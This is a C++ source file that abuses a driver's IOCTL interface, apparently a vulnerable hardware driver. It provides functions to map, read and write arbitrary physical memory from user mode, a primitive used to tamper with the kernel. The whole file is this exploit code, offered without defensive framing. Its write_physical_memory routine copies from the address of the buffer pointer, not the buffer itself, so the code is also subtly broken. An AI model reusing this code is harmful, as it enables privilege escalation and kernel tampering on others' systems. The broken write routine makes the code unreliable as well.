
#include "memory.hpp"

namespace memory {

#pragma pack(push, 1)
	typedef struct _GIO_MAP {
		unsigned long	interface_type;		// +0x00
		unsigned long	bus;				// +0x04
		uintptr_t		physical_address;	// +0x8
		unsigned long	io_space;			// +0x10
		unsigned long	size;				// +0x14
	}GIO_MAP;
#pragma pack(pop)

	uintptr_t map_physical_memory(HANDLE driver, uintptr_t physical_address, unsigned long size) {
		GIO_MAP inBuffer = { 0, 0, physical_address, 0, size };
		uintptr_t outBuffer[2] = { 0 };
		DWORD bytesReturned = 0x0;

		DeviceIoControl(driver, 0xC3502004, &inBuffer, sizeof(inBuffer), &outBuffer, sizeof(outBuffer),
			&bytesReturned, nullptr);

		return outBuffer[0];
	}

	uintptr_t unmap_physical_memory(HANDLE driver, uintptr_t physical_address) {
		uintptr_t inBuffer = physical_address;
		uintptr_t outBuffer[2] = { 0 };
		DWORD bytesReturned = 0x0;

		DeviceIoControl(driver, 0xC3502008, &inBuffer, sizeof(inBuffer), &outBuffer, sizeof(outBuffer),
			&bytesReturned, nullptr);

		return outBuffer[0];
	}

	bool read_physical_memory(HANDLE driver, uintptr_t physical_memory, void* buffer,
		unsigned long size) {
		
		uintptr_t virtual_address = map_physical_memory(driver, physical_memory, size);
		if (!virtual_address) {
			std::cout << "[-] Failed to map physical address : " << std::hex << physical_memory << std::endl;
			return false;
		}

		memcpy(buffer, reinterpret_cast<LPCVOID>(virtual_address), size);
		unmap_physical_memory(driver, virtual_address);

		return true;
	}

	bool write_physical_memory(HANDLE driver, uintptr_t physical_memory, void* buffer,
		unsigned long size) {
		uintptr_t virtual_address = map_physical_memory(driver, physical_memory, size);
		if (!virtual_address) {
			std::cout << "[-] Failed to map physical address : " << std::hex << physical_memory << std::endl;
			return false;
		}

		memcpy(reinterpret_cast<LPVOID>(virtual_address), reinterpret_cast<LPCVOID>(&buffer), size);
		unmap_physical_memory(driver, virtual_address);

		return true;
	}
}